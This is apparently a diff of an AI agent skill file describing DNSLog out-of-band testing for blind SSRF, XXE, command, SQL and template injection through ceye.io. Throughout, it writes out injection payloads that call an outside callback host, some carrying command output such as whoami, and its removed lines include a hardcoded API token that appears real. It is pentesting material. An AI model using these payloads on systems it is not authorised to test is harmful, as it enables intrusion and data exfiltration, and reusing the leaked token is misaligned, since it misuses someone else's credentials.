@@ -1,125 +1,81 @@
 ---
 name: ceye-dnslog
-description: "DNSLog out-of-band detection — use ceye.io DNS/HTTP callback service to detect blind vulnerabilities like SSRF, XXE, command injection, and SQL injection. Trigger when: blind/out-of-band vulnerability testing, no visible output from injections, SSRF/XXE/command injection/SQL injection detection."
+description: "DNSLog out-of-band detection — use a configured ceye.io (or compatible) DNS/HTTP callback service to detect blind vulnerabilities like SSRF, XXE, command injection, and SQL injection. Trigger when: blind/out-of-band vulnerability testing, no visible output from injections, SSRF/XXE/command injection/SQL injection detection."
 ---
 
 # DNSLog / Reverse Connection Detection Skill (ceye.io)
 
 ## Overview
 
-DNSLog (also called reverse/OOB detection) is a technique for detecting **blind vulnerabilities** that do not return visible output. The core idea: generate a unique subdomain under `ek9k64.ceye.io`, inject it into the target, then check whether the DNS/HTTP callback was received via the ceye.io API.
+DNSLog (also called reverse/OOB detection) detects **blind vulnerabilities** that do not return visible output. Generate a unique subdomain under your configured callback domain, inject it into the target, then poll the provider API for DNS/HTTP callbacks.
 
-## Credentials
+## Credentials (user-configured — never hardcode shared tokens)
 
-| Field | Value |
-|-------|-------|
-| Identifier | `ek9k64` |
-| Domain | `*.ek9k64.ceye.io` |
-| API Token | `701bba7e6735843777212d526edf5f1f` |
-| DNS API | `http://api.ceye.io/v1/records?token=701bba7e6735843777212d526edf5f1f&type=dns` |
-| HTTP API | `http://api.ceye.io/v1/records?token=701bba7e6735843777212d526edf5f1f&type=http` |
+Obtain Identifier, Domain, and API Token from the user's ceye.io account (or compatible OOB provider). Prefer host settings / secrets when available. Use placeholders:
+
+| Field | Placeholder |
+|-------|-------------|
+| Identifier | `$CEYE_ID` |
+| Domain | `*.$CEYE_ID.ceye.io` |
+| API Token | `$CEYE_TOKEN` |
+| DNS API | `http://api.ceye.io/v1/records?token=$CEYE_TOKEN&type=dns` |
+| HTTP API | `http://api.ceye.io/v1/records?token=$CEYE_TOKEN&type=http` |
+
+If credentials are missing, ask once for the user's Identifier and Token (or stop OOB checks). Do not embed, invent, or reuse another session's token.
 
 ## Workflow
 
 ### Step 1: Obtain a Unique Identifier
 
-Generate a unique subdomain per test to correlate callbacks with injection points:
-
 ```bash
-# Generate a unique subdomain (timestamp + random)
-echo "$(date +%s)$(head -c4 /dev/urandom | xxd -p).ek9k64.ceye.io"
+echo "$(date +%s)$(head -c4 /dev/urandom | xxd -p).$CEYE_ID.ceye.io"
 ```
 
 ### Step 2: Inject the Payload into the Target
 
-Use the generated subdomain (represented as `PAYLOAD.ek9k64.ceye.io` below) in the following injection patterns:
+Use the generated subdomain (represented as `PAYLOAD.$CEYE_ID.ceye.io` below):
 
 #### Blind SSRF / HTTP Request
 ```
-# Via URL parameter
-http://target.com/api?url=http://PAYLOAD.ek9k64.ceye.io
-
-# Via request body (XML/JSON)
-<?xml version="1.0"?>
-<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://PAYLOAD.ek9k64.ceye.io/test">]>
-<data>&xxe;</data>
-
-# Via HTTP headers
-X-Forwarded-For: PAYLOAD.ek9k64.ceye.io
-Referer: http://PAYLOAD.ek9k64.ceye.io
+http://target.com/api?url=http://PAYLOAD.$CEYE_ID.ceye.io
+X-Forwarded-For: PAYLOAD.$CEYE_ID.ceye.io
+Referer: http://PAYLOAD.$CEYE_ID.ceye.io
 ```
 
 #### Blind Command Injection
 ```bash
-# Linux / Unix
-; ping -c 3 PAYLOAD.ek9k64.ceye.io
-| nslookup PAYLOAD.ek9k64.ceye.io
-`curl http://PAYLOAD.ek9k64.ceye.io/$(whoami)`
-$(wget http://PAYLOAD.ek9k64.ceye.io/$(hostname))
-
-# Windows
-& ping -n 3 PAYLOAD.ek9k64.ceye.io
-| nslookup PAYLOAD.ek9k64.ceye.io %USERNAME%.PAYLOAD.ek9k64.ceye.io
+; ping -c 3 PAYLOAD.$CEYE_ID.ceye.io
+| nslookup PAYLOAD.$CEYE_ID.ceye.io
+`curl http://PAYLOAD.$CEYE_ID.ceye.io/$(whoami)`
 ```
 
-#### Blind SQL Injection (MySQL / PostgreSQL / MSSQL / Oracle)
+#### Blind SQL Injection (examples)
 ```sql
--- MySQL (Windows, requires file privilege)
-SELECT LOAD_FILE(CONCAT('\\\\',(SELECT database()),'.PAYLOAD.ek9k64.ceye.io\\a'));
-
--- PostgreSQL
-CREATE OR REPLACE FUNCTION dnslog() RETURNS VOID AS $$
-DECLARE cmd TEXT;
-BEGIN
-  cmd := E'ping -c 1 '||(SELECT current_database())||E'.PAYLOAD.ek9k64.ceye.io';
-  PERFORM dblink_exec(cmd);
-END;
-$$ LANGUAGE plpgsql;
-
+-- MySQL (Windows UNC, requires privilege)
+SELECT LOAD_FILE(CONCAT('\\\\',(SELECT database()),'.PAYLOAD.$CEYE_ID.ceye.io\\a'));
 -- MSSQL
 DECLARE @host VARCHAR(800);
-SELECT @host = DB_NAME()+'.PAYLOAD.ek9k64.ceye.io';
+SELECT @host = DB_NAME()+'.PAYLOAD.$CEYE_ID.ceye.io';
 EXEC('master..xp_dirtree "\\'+@host+'\c$"');
-
--- Oracle (UTL_HTTP / UTL_INADDR)
-SELECT UTL_INADDR.GET_HOST_ADDRESS((SELECT SYS.DATABASE_NAME FROM DUAL)||'.PAYLOAD.ek9k64.ceye.io') FROM DUAL;
-```
-
-#### SSTI (Server-Side Template Injection)
-```
-# Jinja2 / Twig
-{{ ''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read() }}
-{{ config.__class__.__init__.__globals__['os'].popen('curl http://PAYLOAD.ek9k64.ceye.io/$(whoami)').read() }}
-
-# Java FreeMarker
-${"freemarker.template.utility.Execute"?new()("nslookup PAYLOAD.ek9k64.ceye.io")}
-
-# PHP Twig
-{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("nslookup PAYLOAD.ek9k64.ceye.io")}}
 ```
 
 ### Step 3: Poll for Callbacks
 
 ```bash
-# Poll DNS records
-curl -s "http://api.ceye.io/v1/records?token=701bba7e6735843777212d526edf5f1f&type=dns&filter="
-
-# Poll HTTP records
-curl -s "http://api.ceye.io/v1/records?token=701bba7e6735843777212d526edf5f1f&type=http&filter="
+curl -s "http://api.ceye.io/v1/records?token=$CEYE_TOKEN&type=dns&filter="
+curl -s "http://api.ceye.io/v1/records?token=$CEYE_TOKEN&type=http&filter="
 ```
 
 ### Step 4: Interpret Results
 
-- **DNS query received** → target executed the injected command / resolved the domain. Confirms the vulnerability exists.
-- **Subdomain contains data** (e.g., `whoami.PAYLOAD.ek9k64.ceye.io`) → you've also exfiltrated information.
-- **HTTP request received** → target supports outbound HTTP (useful for SSRF chaining).
-- **No callback** → try different injection points, protocols, or encoding. Some environments block DNS/HTTP outbound.
+- **DNS query received** → target resolved/executed the injected name.
+- **Subdomain contains data** → possible data exfiltration via DNS labels.
+- **HTTP request received** → outbound HTTP from the target.
+- **No callback** → try different points/protocols; do not invent a hit.
 
 ## Tips
 
-1. **Always use unique subdomains per test** to correlate callbacks with specific injection points.
-2. **Prefer DNS over HTTP** — DNS is harder to block and often permitted even in restricted networks.
-3. **Encode special characters** in subdomains: `$(whoami)` becomes `$(whoami)` in the URL but the payload itself remains raw when injected.
-4. **Use the ping utility as a fallback** when `curl`/`wget` are unavailable — ICMP can also be monitored on some platforms.
-5. **Rate limits apply** — most free services have API rate limits. Space out your polls by at least 30 seconds.
-6. **For authenticated targets**, the callback will come from the server's IP, not yours — this is expected behavior.
+1. Unique subdomain per injection point.
+2. Prefer DNS over HTTP when egress is restricted.
+3. Space polls (≥30s) to respect provider rate limits.
+4. Server-side callbacks come from the target's IP, not the tester's.
